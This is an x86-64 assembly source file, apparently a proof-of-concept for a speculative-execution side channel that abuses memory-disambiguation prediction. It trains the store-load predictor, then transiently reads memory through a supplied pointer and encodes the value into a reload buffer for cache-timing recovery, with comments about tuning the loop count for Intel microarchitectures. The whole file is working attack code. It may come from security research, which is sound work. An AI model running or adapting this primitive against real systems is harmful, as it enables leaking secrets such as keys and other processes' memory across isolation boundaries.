%include "common.S"

%define MD_OFF (LEAK_SIZE*STRIDE)

section .data noexec write
    align 0x1000
    mem:
    %rep 0x1000
    db  0x0
    %endrep

section .text

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; st_ld(uint64_t *store_addr, uint64_t *load_addr, uint64_t store_val)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;rdi: store addr
;rsi: load  addr
;rdx: store val
;ret: loaded val
global st_ld
st_ld:
    %rep 32             ;TWEAK
    imul    rdi, 1
    %endrep

    mov     qword [rdi], rdx
    mov     rax, qword [rsi]
    ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; md_win_size(uint8_t *reload_buffer)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global md_win_size
md_win_size:
    push    rcx
    push    r15
    mov     r15, rdi

    SERIALIZE

    mov     rcx, 80     ;TWEAK (On Intel must be > 15+64, uarch dependent must bring to hoisting)
md_win_size_loop:
    lea     rdi, [mem]
    lea     rsi, [mem+64]
    mov     rdx, 0
    call    st_ld
    loop    md_win_size_loop

    lea     rdi, [mem]
    lea     rsi, [mem]
    mov     rdx, MD_OFF
    call    st_ld

    add     r15, rax
    LOADS   r15 

    pop     r15
    pop     rcx
    ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; md_win_size_branch(uint8_t *reload_buffer)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global md_win_size_branch
md_win_size_branch:
    push    rcx
    push    r15
    mov     r15, rdi
    SERIALIZE

    mov     rcx, 80
md_win_size_branch_loop:
    lea     rdi, [mem]
    lea     rsi, [mem+64]
    mov     rdx, 0
    call    st_ld
    loop    md_win_size_branch_loop

    lea     rdi, [mem]
    lea     rsi, [mem]
    mov     rdx, 1
    call    st_ld

    cmp     rax, 0
    jne     md_win_size_branch_arch_code

md_win_size_branch_spec_code:
    LOADS   r15 
    ud2

md_win_size_branch_arch_code:
    pop     r15
    pop     rcx
    ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; md_leak(uint8_t *reload_buffer, uint8_t *leak_ptr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global md_leak
md_leak:
    push    rcx
    push    r14
    push    r15
    mov     r15, rdi
    mov     r14, rsi

    mov     rcx, 80             ;TWEAK
md_leak_loop:
    lea     rdi, [mem]
    lea     rsi, [mem+64]
    mov     rdx, 0
    call    st_ld
    loop    md_leak_loop

    lea     rdi, [mem]
    lea     rsi, [mem]
    mov     rdx, MD_OFF
    call    st_ld
    add     r15, rax
    LEAK    r15, r14 

    pop     r15
    pop     r14
    pop     rcx
    ret
